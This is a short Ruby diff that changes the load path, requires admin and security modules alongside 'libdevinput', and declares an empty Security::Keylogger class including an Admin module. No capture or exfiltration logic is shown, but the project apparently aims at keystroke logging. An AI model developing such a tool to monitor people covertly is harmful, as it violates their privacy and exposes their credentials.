@@ -6,9 +6,15 @@
 require 'rubygems'
 require 'libdevinput'
 
-require_relative 'security'
+$LOAD_PATH.push File.expand_path('../../', __FILE__)
+
+require 'admin/admin'
+require 'security/security'
 
 module Security
+  class Keylogger
+    include Admin
+  end
 end
 
 if __FILE__ == $PROGRAM_NAME
